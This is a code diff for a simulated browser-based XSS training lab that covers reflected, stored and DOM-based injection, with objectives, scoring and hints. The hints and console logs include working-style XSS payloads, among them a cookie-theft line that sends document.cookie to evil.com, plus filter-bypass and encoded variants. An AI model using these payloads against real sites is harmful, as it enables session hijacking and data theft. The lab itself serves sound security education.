+    /** Update the URL bar as the user types */
+    function updateUrlBar(value) {
+        const encoded = value.length > 0 ? encodeURIComponent(value) : '';
+        document.getElementById('urlBar1').textContent =
+            'http://novacorp-forum.local/search?q=' + encoded;
+    }
+
+    /** Execute the search, reflect the term, detect XSS patterns */
+    function doSearch() {
+        const input = document.getElementById('searchInput');
+        const raw = input.value.trim();
+
+        if (!raw) {
+            document.getElementById('searchHeading').textContent = 'Enter a search term above.';
+            document.getElementById('searchResults').innerHTML = '';
+            const h = document.createElement('div');
+            h.className = 'search-results-heading';
+            h.style.color = 'var(--text-faint)';
+            h.style.fontSize = '0.75rem';
+            h.textContent = 'Enter a search term above.';
+            document.getElementById('searchResults').appendChild(h);
+            return;
+        }
+
+        state.searchCount++;
+
+        // Obj1: user has discovered the search reflection (first search attempt)
+        if (state.searchCount === 1 && !state.objectives.obj1) {
+            completeObjective('obj1', 'Reflected injection point discovered');
+        }
+
+        // Analyze for XSS
+        const xss = detectXSS(raw);
+
+        // Build results container
+        const container = document.getElementById('searchResults');
+        container.innerHTML = '';
+
+        // Reflected heading — shows how the server "echoes" the query.
+        // We use textContent to build the static parts, then set the
+        // injected span using textContent too (safe display-only render).
+        const heading = document.createElement('div');
+        heading.className = 'search-results-heading';
+
+        if (xss.isXss) {
+            // Show what a vulnerable server would return in its HTML
+            // (educational display only — the tag itself is shown as text)
+            heading.innerHTML = 'Results for: <span class="reflected-output" style="color: #f87171;"></span>';
+            heading.querySelector('.reflected-output').textContent = raw;
+
+            // Simulate XSS execution in the console
+            triggerXssFlash();
+            simulateXssExecution(raw, xss, 'reflected');
+
+        } else {
+            // Safe display — plain text reflection
+            heading.innerHTML = 'Results for: <span class="reflected-output"></span>';
+            heading.querySelector('.reflected-output').textContent = raw;
+
+            // Inform what's happening
+            if (!xss.isXss) {
+                consoleLog('Search: "' + sanitizeForLog(raw, 60) + '" — no XSS pattern detected.', 'info');
+            }
+        }
+
+        container.appendChild(heading);
+
+        // Fake result items (always shown for realism)
+        const fakeResults = [
+            { title: 'NovaCorp Forum — General Discussion', snippet: 'Community posts and announcements from the NovaCorp team...' },
+            { title: 'Security Policy Updates — Q1 2026', snippet: 'All employees are reminded to rotate credentials after the January incident...' }
+        ];
+
+        fakeResults.forEach(r => {
+            const item = document.createElement('div');
+            item.className = 'search-result-item';
+            const title = document.createElement('div');
+            title.className = 'result-title';
+            title.textContent = r.title;
+            const snippet = document.createElement('div');
+            snippet.className = 'result-snippet';
+            snippet.textContent = r.snippet;
+            item.appendChild(title);
+            item.appendChild(snippet);
+            container.appendChild(item);
+        });
+
+        // Update source panel to show reflected context
+        if (state.activePanel === 'source') {
+            updateSourcePanel();
+        }
+    }
+
+    // ─────────────────────────────────────────────────────────────────────────
+    // CHALLENGE 2: STORED XSS
+    // ─────────────────────────────────────────────────────────────────────────
+
+    function submitComment() {
+        const nameEl = document.getElementById('commentName');
+        const bodyEl = document.getElementById('commentBody');
+        const name = nameEl.value.trim() || 'anonymous';
+        const body = bodyEl.value.trim();
+
+        if (!body) {
+            consoleLog('Comment body is empty.', 'info');
+            return;
+        }
+
+        const xss = detectXSS(body);
+        const nameXss = detectXSS(name);
+
+        // Build comment object
+        const comment = {
+            name: name,
+            body: body,
+            time: 'just now',
+            isXss: xss.isXss || nameXss.isXss,
+            xssData: xss
+        };
+
+        state.storedComments.push(comment);
+        renderComment(comment);
+
+        // Log submission
+        consoleLog('Comment submitted by "' + sanitizeForLog(name, 30) + '".', 'info');
+
+        // If XSS detected — simulate stored XSS execution
+        if (xss.isXss || nameXss.isXss) {
+            const activeXss = xss.isXss ? xss : nameXss;
+
+            // Slight delay — simulates the comment loading for all visitors
+            setTimeout(() => {
+                triggerXssFlash();
+                consoleLog('--- Stored XSS payload executed (as seen by ALL visitors) ---', 'xss');
+                simulateXssExecution(body, activeXss, 'stored');
+
+                // Obj4: stored XSS submitted
+                completeObjective('obj4', 'Stored XSS payload submitted and persisted');
+
+                // Obj5: cookie theft
+                if (activeXss.hasCookieTheft) {
+                    setTimeout(() => {
+                        consoleLog('Cookie stolen: ' + SIMULATED_COOKIES, 'cookie');
+                        consoleLog('Exfiltration: GET http://evil.com/steal?c=' + SIMULATED_COOKIES, 'network');
+                        completeObjective('obj5', 'Cookie theft via stored XSS demonstrated');
+                    }, 600);
+                }
+            }, 400);
+        }
+
+        // Obj8: encoded payload (check both name and body)
+        const combinedRaw = name + ' ' + body;
+        const combinedXss = detectXSS(combinedRaw);
+        if ((xss.isEncoded || nameXss.isEncoded || combinedXss.isEncoded) && (xss.isXss || nameXss.isXss)) {
+            setTimeout(() => completeObjective('obj8', 'Encoded/obfuscated payload executed'), 800);
+        }
+
+        // Clear form
+        nameEl.value = '';
+        bodyEl.value = '';
+
+        if (state.activePanel === 'source') {
+            updateSourcePanel();
+        }
+    }
+
+    /** Render a comment item in the DOM */
+    function renderComment(comment) {
+        const list = document.getElementById('commentList');
+        const item = document.createElement('div');
+        item.className = 'comment-item' + (comment.isXss ? ' injected' : '');
+
+        const header = document.createElement('div');
+        header.className = 'comment-header';
+
+        const avatar = document.createElement('div');
+        avatar.className = 'post-avatar';
+        avatar.style.cssText = 'width:22px;height:22px;font-size:0.58rem;';
+        // Use first 2 chars of name (textContent safe)
+        avatar.textContent = comment.name.replace(/[^A-Za-z ]/g, '').substring(0, 2).toUpperCase() || '??';
+
+        const author = document.createElement('span');
+        author.className = 'comment-author';
+        author.textContent = comment.name;
+
+        const time = document.createElement('span');
+        time.className = 'comment-time';
+        time.textContent = comment.time;
+
+        header.appendChild(avatar);
+        header.appendChild(author);
+
+        if (comment.isXss) {
+            const tag = document.createElement('span');
+            tag.className = 'xss-tag';
+            tag.textContent = 'XSS';
+            header.appendChild(tag);
+        }
+
+        header.appendChild(time);
+        item.appendChild(header);
+
+        const body = document.createElement('div');
+        body.className = 'comment-body';
+        // Display the raw payload text safely using textContent
+        body.textContent = comment.body;
+        item.appendChild(body);
+
+        list.appendChild(item);
+        // Scroll comment list into view
+        item.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+    }
+
+    // ─────────────────────────────────────────────────────────────────────────
+    // CHALLENGE 3: DOM-BASED XSS
+    // ─────────────────────────────────────────────────────────────────────────
+
+    function updateDomUrl(value) {
+        document.getElementById('urlBar3').textContent =
+            'http://novacorp-forum.local/profile' + (value || '#');
+    }
+
+    function applyDomFragment() {
+        const input = document.getElementById('domFragmentInput');
+        let fragment = input.value.trim();
+
+        // Ensure it starts with #
+        if (fragment && !fragment.startsWith('#')) {
+            fragment = '#' + fragment;
+        }
+
+        updateDomUrl(fragment);
+
+        // The raw value after the #
+        const rawName = fragment.startsWith('#') ? fragment.substring(1) : fragment;
+
+        // Obj6: user has navigated to the profile tab and interacted with the fragment
+        completeObjective('obj6', 'DOM XSS vulnerability identified in location.hash');
+
+        const xss = detectXSS(rawName);
+
+        // Update the greeting render — display the raw text (safely)
+        const renderEl = document.getElementById('greetingRender');
+        if (xss.isXss) {
+            // Show the payload text in the greeting (display only, not executed)
+            renderEl.textContent = rawName;
+            renderEl.style.color = 'var(--red)';
+
+            // Simulate DOM-based XSS execution
+            triggerXssFlash();
+            consoleLog('--- DOM XSS executed: location.hash written to innerHTML ---', 'xss');
+            consoleLog('Vulnerable sink: greetingRender.innerHTML = location.hash.substring(1)', 'xss');
+
+            simulateXssExecution(rawName, xss, 'dom');
+
+            // Obj7: DOM XSS triggered
+            completeObjective('obj7', 'DOM-based XSS triggered via URL fragment');
+
+            // Obj8: encoded payload
+            if (xss.isEncoded) {
+                setTimeout(() => completeObjective('obj8', 'Encoded/obfuscated payload executed'), 400);
+            }
+        } else {
+            // Safe: just update greeting with plain text name
+            renderEl.textContent = rawName || 'guest';
+            renderEl.style.color = 'var(--accent-light)';
+            consoleLog('Fragment set to: "' + sanitizeForLog(rawName, 80) + '" — no XSS pattern.', 'info');
+        }
+
+        if (state.activePanel === 'source') {
+            updateSourcePanel();
+        }
+    }
+
+    // ─────────────────────────────────────────────────────────────────────────
+    // XSS SIMULATION ORCHESTRATOR
+    // Handles all the console output and dialog simulation for a detected payload.
+    // @param {string} raw - The raw user input
+    // @param {object} xss - Detection result from detectXSS()
+    // @param {'reflected'|'stored'|'dom'} context - Where injection occurred
+    // ─────────────────────────────────────────────────────────────────────────
+
+    function simulateXssExecution(raw, xss, context) {
+        const prefix = context === 'reflected' ? '[Reflected XSS]'
+                     : context === 'stored'    ? '[Stored XSS]'
+                     :                           '[DOM XSS]';
+
+        consoleLog(prefix + ' Payload detected: ' + sanitizeForLog(raw, 80), 'xss');
+        consoleLog(prefix + ' Type: ' + xss.type, 'xss');
+
+        // Simulate alert dialog if payload has alert()
+        if (xss.hasAlert) {
+            const alertMsg = xss.alertMsg || 'XSS';
+            consoleLog('alert("' + alertMsg + '") called', 'alert');
+            setTimeout(() => showSimAlert(alertMsg), 300);
+
+            // Objective tracking for ch1
+            if (context === 'reflected') {
+                state.ch1AlertCount++;
+                if (xss.isScript && !state.objectives.obj2) {
+                    completeObjective('obj2', 'Reflected XSS alert via script tag triggered');
+                }
+                if (xss.isEventHandler && !state.objectives.obj3) {
+                    completeObjective('obj3', 'Event-handler XSS payload triggered');
+                }
+                if (xss.isSvg && !state.objectives.obj3) {
+                    completeObjective('obj3', 'SVG onload XSS payload triggered');
+                }
+            }
+        } else if (xss.isEventHandler || xss.isSvg) {
+            // Event-handler payload without explicit alert()
+            consoleLog('Event handler fired. Payload executed in page context.', 'xss');
+            if (context === 'reflected') {
+                if (!state.objectives.obj3) {
+                    completeObjective('obj3', 'Event-handler XSS payload triggered');
+                }
+            }
+        }
+
+        // Simulate cookie access if payload touches document.cookie
+        if (xss.hasCookieTheft && context === 'reflected') {
+            setTimeout(() => {
+                consoleLog('document.cookie = "' + SIMULATED_COOKIES + '"', 'cookie');
+                completeObjective('obj5', 'Cookie theft demonstrated via reflected XSS');
+            }, 500);
+        }
+
+        // Obj8: encoded payload
+        if (xss.isEncoded) {
+            setTimeout(() => completeObjective('obj8', 'Encoded/obfuscated payload triggered'), 600);
+        }
+
+        // Obj2 via event handler (catches <img onerror=alert(...)> for ch1)
+        if (context === 'reflected' && xss.isEventHandler && xss.hasAlert && !state.objectives.obj3) {
+            completeObjective('obj3', 'Event-handler XSS payload triggered');
+        }
+    }
+
+    // ─────────────────────────────────────────────────────────────────────────
+    // HTML SOURCE PANEL
+    // Shows syntax-highlighted pseudocode representing the vulnerable server-side
+    // HTML that would be generated. Injection points are highlighted.
+    // ─────────────────────────────────────────────────────────────────────────
+
+    const SOURCE_TEMPLATES = {
+        1: function() {
+            const raw = document.getElementById('searchInput').value || '[SEARCH_TERM]';
+            const safeRaw = escapeHtml(raw);
+            const isXss = detectXSS(raw).isXss;
+            const injected = isXss
+                ? '<span class="src-inject">' + safeRaw + '</span>'
+                : '<span class="src-str">' + safeRaw + '</span>';
+            return `<div class="source-section-label">// Server-generated HTML — search.php</div>
+<span class="src-tag">&lt;!DOCTYPE html&gt;</span>
+<span class="src-tag">&lt;html&gt;</span>
+  <span class="src-tag">&lt;head&gt;</span>
+    <span class="src-tag">&lt;title&gt;</span><span class="src-text">NovaCorp Forum — Search</span><span class="src-tag">&lt;/title&gt;</span>
+  <span class="src-tag">&lt;/head&gt;</span>
+  <span class="src-tag">&lt;body&gt;</span>
+    <span class="src-cmt">&lt;!-- Search results section --&gt;</span>
+    <span class="src-tag">&lt;h2&gt;</span><span class="src-text">Results for: </span>${injected}<span class="src-tag">&lt;/h2&gt;</span>
+    <span class="src-cmt">&lt;!-- NOTE: \$_GET['q'] is echoed directly --&gt;</span>
+    <span class="src-cmt">&lt;!-- No htmlspecialchars(), no sanitization --&gt;</span>
+    <span class="src-tag">&lt;?php</span>
+      <span class="src-js">$query = $_GET['q'];  // UNSANITIZED</span>
+      <span class="src-js">echo "&lt;h2&gt;Results for: " . $query . "&lt;/h2&gt;";</span>
+    <span class="src-tag">?&gt;</span>
+    <span class="src-tag">&lt;div</span> <span class="src-attr">class=</span><span class="src-str">"results"</span><span class="src-tag">&gt;</span>
+      <span class="src-text">... results ...</span>
+    <span class="src-tag">&lt;/div&gt;</span>
+  <span class="src-tag">&lt;/body&gt;</span>
+<span class="src-tag">&lt;/html&gt;</span>`;
+        },
+
+        2: function() {
+            const lastComment = state.storedComments[state.storedComments.length - 1];
+            const rawBody = lastComment ? lastComment.body : '[COMMENT_BODY]';
+            const rawName = lastComment ? lastComment.name : 'user';
+            const safeBody = escapeHtml(rawBody);
+            const safeName = escapeHtml(rawName);
+            const isXss = lastComment && lastComment.isXss;
+            const injectedBody = isXss
+                ? '<span class="src-inject">' + safeBody + '</span>'
+                : '<span class="src-str">' + safeBody + '</span>';
+            return `<div class="source-section-label">// Stored XSS — thread.php (rendered for every visitor)</div>
+<span class="src-tag">&lt;div</span> <span class="src-attr">class=</span><span class="src-str">"comment"</span><span class="src-tag">&gt;</span>
+  <span class="src-tag">&lt;span</span> <span class="src-attr">class=</span><span class="src-str">"author"</span><span class="src-tag">&gt;</span>
+    <span class="src-str">${safeName}</span>
+  <span class="src-tag">&lt;/span&gt;</span>
+  <span class="src-tag">&lt;p</span> <span class="src-attr">class=</span><span class="src-str">"body"</span><span class="src-tag">&gt;</span>
+    ${injectedBody}
+  <span class="src-tag">&lt;/p&gt;</span>
+<span class="src-tag">&lt;/div&gt;</span>
+
+<span class="src-cmt">/* PHP that stores &amp; retrieves this comment: */</span>
+<span class="src-tag">&lt;?php</span>
+  <span class="src-cmt">// INSERT INTO comments (name, body) VALUES ($name, $body)</span>
+  <span class="src-js">// No sanitization on INSERT or SELECT</span>
+  <span class="src-js">$comments = $db->query("SELECT * FROM comments");</span>
+  <span class="src-js">foreach ($comments as $c) {</span>
+  <span class="src-js">  echo "&lt;p&gt;" . $c['body'] . "&lt;/p&gt;";</span>
+  <span class="src-cmt">  // DANGEROUS: echoes raw HTML from database</span>
+  <span class="src-js">}</span>
+<span class="src-tag">?&gt;</span>`;
+        },
+
+        3: function() {
+            const fragment = document.getElementById('domFragmentInput')?.value || '#guest';
+            const safeFragment = escapeHtml(fragment);
+            return `<div class="source-section-label">// DOM-Based XSS — profile.js (client-side)</div>
+<span class="src-tag">&lt;div</span> <span class="src-attr">id=</span><span class="src-str">"greeting"</span><span class="src-tag">&gt;</span>
+  <span class="src-text">Welcome, </span>
+  <span class="src-tag">&lt;span</span> <span class="src-attr">id=</span><span class="src-str">"greetingRender"</span><span class="src-tag">&gt;&lt;/span&gt;</span>
+<span class="src-tag">&lt;/div&gt;</span>
+
+<span class="src-tag">&lt;script&gt;</span>
+  <span class="src-cmt">// DOM sink: innerHTML with unsanitized location.hash</span>
+  <span class="src-js">const name = location.hash.substring(1);</span>
+  <span class="src-cmt">// Current fragment value: <span class="src-inject">${safeFragment}</span></span>
+  <span class="src-js">document.getElementById('greetingRender')</span>
+  <span class="src-inject">    .innerHTML = name;  // ← VULNERABLE SINK</span>
+  <span class="src-cmt">// Fix: use .textContent instead of .innerHTML</span>
+  <span class="src-cmt">// Or: DOMPurify.sanitize(name) before assignment</span>
+<span class="src-tag">&lt;/script&gt;</span>
+
+<span class="src-cmt">// The server never touches this data.</span>
+<span class="src-cmt">// The vulnerability is entirely client-side —</span>
+<span class="src-cmt">// traditional WAFs cannot detect DOM-based XSS.</span>`;
+        }
+    };
+
+    function updateSourcePanel() {
+        const panel = document.getElementById('sourcePanel');
+        const template = SOURCE_TEMPLATES[state.activeChallenge];
+        if (template) {
+            // Templates produce safe HTML using escapeHtml() for all user data
+            panel.innerHTML = template();
+        }
+    }
+
+    // HTML-escaping utility — used inside source templates to safely display user input
+    function escapeHtml(str) {
+        return String(str)
+            .replace(/&/g, '&amp;')
+            .replace(/</g, '&lt;')
+            .replace(/>/g, '&gt;')
+            .replace(/"/g, '&quot;')
+            .replace(/'/g, '&#039;');
+    }
+
+    // Truncate and escape a string for console output
+    function sanitizeForLog(str, maxLen) {
+        const truncated = String(str).substring(0, maxLen);
+        return truncated + (String(str).length > maxLen ? '...' : '');
+    }
+
+    // ─────────────────────────────────────────────────────────────────────────
+    // NAVIGATION: Tabs & Panels
+    // ─────────────────────────────────────────────────────────────────────────
+
+    function switchChallenge(num) {
+        state.activeChallenge = num;
+
+        // Update tab buttons
+        [1, 2, 3].forEach(n => {
+            document.getElementById('tab' + n).classList.toggle('active', n === num);
+        });
+
+        // Show/hide challenge panels
+        document.getElementById('challenge1').style.display = num === 1 ? 'block' : 'none';
+        document.getElementById('challenge2').style.display = num === 2 ? 'block' : 'none';
+        document.getElementById('challenge3').style.display = num === 3 ? 'block' : 'none';
+
+        // Obj6: switching to ch3 means the user has identified the DOM XSS page
+        if (num === 3 && !state.objectives.obj6) {
+            completeObjective('obj6', 'DOM XSS vulnerability identified in profile page');
+        }
+
+        // Refresh source panel
+        updateSourcePanel();
+
+        // Log context switch
+        const labels = { 1: 'Reflected XSS', 2: 'Stored XSS', 3: 'DOM-Based XSS' };
+        consoleLog('Navigated to challenge: ' + labels[num], 'info');
+    }
+
+    function switchPanel(panel) {
+        state.activePanel = panel;
+
+        document.querySelectorAll('.panel-tab').forEach(t => t.classList.remove('active'));
+        document.querySelectorAll('.panel-view').forEach(v => v.classList.remove('active'));
+
+        if (panel === 'source') {
+            document.querySelectorAll('.panel-tab')[0].classList.add('active');
+            document.getElementById('panelSource').classList.add('active');
+            updateSourcePanel();
+        } else {
+            document.querySelectorAll('.panel-tab')[1].classList.add('active');
+            document.getElementById('panelObjectives').classList.add('active');
+        }
+    }
+
+    // ─────────────────────────────────────────────────────────────────────────
+    // PAYLOAD CHEAT SHEET — click to copy to active input
+    // ─────────────────────────────────────────────────────────────────────────
+
+    function copyPayload(el) {
+        const text = el.textContent;
+
+        // Determine which input to target based on active challenge
+        let target = null;
+        if (state.activeChallenge === 1) {
+            target = document.getElementById('searchInput');
+        } else if (state.activeChallenge === 2) {
+            target = document.getElementById('commentBody');
+        } else if (state.activeChallenge === 3) {
+            target = document.getElementById('domFragmentInput');
+        }
+
+        if (target) {
+            target.value = text;
+            target.focus();
+            // Dispatch input event to trigger URL bar update
+            target.dispatchEvent(new Event('input'));
+        }
+
+        // Visual feedback on the code element
+        const orig = el.style.background;
+        el.style.background = 'rgba(147, 51, 234, 0.2)';
+        el.style.borderColor = 'var(--border-bright)';
+        setTimeout(() => {
+            el.style.background = orig;
+            el.style.borderColor = '';
+        }, 600);
+
+        consoleLog('Payload copied to active input: ' + sanitizeForLog(text, 60), 'info');
+    }
+
+    function toggleCheatsheet() {
+        const toggle = document.getElementById('cheatsheetToggle');
+        const body = document.getElementById('cheatsheetBody');
+        toggle.classList.toggle('open');
+        body.classList.toggle('visible');
+    }
+
+    // ─────────────────────────────────────────────────────────────────────────
+    // HINTS
+    // ─────────────────────────────────────────────────────────────────────────
+
+    const HINTS = [
+        'Challenge 1: Try typing <script>alert(1)</script> into the search bar and click Search.',
+        'Challenge 1: For event-handler payloads, try: <img src=x onerror=alert("XSS")>',
+        'Challenge 2: Paste a cookie-theft payload in the Comment field: <img src=x onerror="fetch(\'http://evil.com/steal?c=\'+document.cookie)">',
+        'Challenge 3: In the fragment input, type: #<img src=x onerror=alert("DOM-XSS")> and click Navigate.',
+        'For objective 8, try a mixed-case bypass like <ScRiPt>alert(1)</ScRiPt> or an HTML-encoded payload like &#x3C;img src=x onerror=&#x61;lert&#x28;1&#x29;&#x3E;'
+    ];
+
+    function showHint() {
+        deductPoints(5);
+        state.hintsUsed++;
+        const hintEl = document.getElementById('hintText');
+        const idx = Math.min(state.hintsUsed - 1, HINTS.length - 1);
+        hintEl.textContent = 'Hint ' + state.hintsUsed + ': ' + HINTS[idx];
+        hintEl.classList.add('visible');
+        consoleLog('Hint used (-5 pts). Score: ' + state.score, 'info');
+    }
+
+    // ─────────────────────────────────────────────────────────────────────────
+    // LAB COMPLETION
+    // ─────────────────────────────────────────────────────────────────────────
+
+    function completeLab() {
+        const done = Object.values(state.objectives).filter(Boolean).length;
+        if (done < 6) {
+            consoleLog('Complete at least 6 objectives before marking the lab done.', 'info');
+            return;
+        }
+
+        consoleLog('Lab complete. Final score: ' + state.score + ' / 100', 'success');
+
+        // Save progress via ModuleProgress component
+        ModuleProgress.complete('dark-arts', 'ehe-lab-xss-attack', {
+            type: 'lab',
+            returnUrl: '../index.html',
+            silent: false
+        });
+    }
+
+    // ─────────────────────────────────────────────────────────────────────────
+    // KEYBOARD SHORTCUT: Enter key on search and DOM fragment inputs
+    // ─────────────────────────────────────────────────────────────────────────
+
+    document.getElementById('searchInput').addEventListener('keydown', function(e) {
+        if (e.key === 'Enter') doSearch();
+    });
+
+    document.getElementById('domFragmentInput').addEventListener('keydown', function(e) {
+        if (e.key === 'Enter') applyDomFragment();
+    });
+
+    // ─────────────────────────────────────────────────────────────────────────
+    // INITIALIZATION
+    // ─────────────────────────────────────────────────────────────────────────
+
+    (function init() {
+        // Initial console welcome messages
+        consoleLog('NovaCorp Forum — Developer Console', 'info');
+        consoleLog('Lab initialized. Three XSS challenge types available.', 'info');
+        consoleLog('Tip: Use the Payload Reference in the Objectives tab for guidance.', 'info');
+
+        // Render initial source panel
+        updateSourcePanel();
+    })();
+
+    </script>
+</body>
+</html>
